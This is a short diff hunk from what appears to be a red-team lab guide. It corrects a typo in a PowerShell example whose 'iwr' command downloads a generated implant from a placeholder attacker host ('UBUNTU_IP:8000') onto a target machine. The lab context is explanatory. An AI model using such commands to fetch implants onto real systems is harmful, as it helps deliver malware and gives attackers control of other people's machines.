@@ -379,7 +379,7 @@ Use your Ubuntu VM's IP and the name of the generated implants:
 Example:
 
 ```powershell
-iwr "http://UBUNTU_IP:8000/IMPLANT_NAME" -OutFile "IMPLANT_NAME.FROMAT"
+iwr "http://UBUNTU_IP:8000/IMPLANT_NAME" -OutFile "IMPLANT_NAME.FORMAT"
 ```
 
 In our case:
